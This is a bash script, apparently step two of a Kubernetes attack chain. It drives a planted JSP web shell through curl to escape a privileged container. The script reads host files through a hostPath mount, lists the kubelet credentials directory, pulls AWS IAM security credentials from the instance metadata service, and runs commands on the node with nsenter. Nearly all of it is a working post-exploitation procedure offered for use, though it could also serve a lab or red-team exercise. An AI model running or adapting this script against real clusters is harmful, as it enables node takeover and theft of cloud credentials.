#!/bin/bash
###############################################
# STEP 2: Container Escape
# The pod runs as privileged with hostPID and
# hostPath mount. We can escape the container
# and access the underlying node.
###############################################

set -e

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

SHELL_URL="http://${HOST}/shell.jsp"

remote_exec() {
    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" | tr -d '\0'
}

echo "============================================"
echo " STEP 2: Container Escape"
echo "============================================"
echo ""

echo "[+] 2.1 - Verify we are in a container..."
remote_exec "cat /proc/1/cgroup"
echo ""

echo "[+] 2.2 - Check privileged mode (hostPID)..."
echo "    Listing host processes visible from the container:"
remote_exec "ps aux | head -20"
echo ""

echo "[+] 2.3 - Access host filesystem via hostPath mount (/host)..."
echo "    Reading host /etc/hostname:"
remote_exec "cat /host/etc/hostname"
echo ""
echo "    Reading host /etc/os-release:"
remote_exec "cat /host/etc/os-release"
echo ""

echo "[+] 2.4 - Read kubelet credentials from host..."
echo "    Listing /host/var/lib/kubelet/:"
remote_exec "ls -la /host/var/lib/kubelet/"
echo ""

echo "[+] 2.5 - Read AWS instance metadata (IMDS) from host network..."
echo "    Getting instance identity:"
remote_exec "curl -s http://169.254.169.254/latest/meta-data/instance-id"
echo ""
echo "    Getting IAM role:"
remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
echo ""

echo "[+] 2.6 - Escape via nsenter (PID 1 = host init)..."
echo "    Running 'hostname' on the HOST via nsenter:"
remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- hostname"
echo ""

echo "============================================"
echo " Container escape successful!"
echo " We have full access to the node."
echo "============================================"
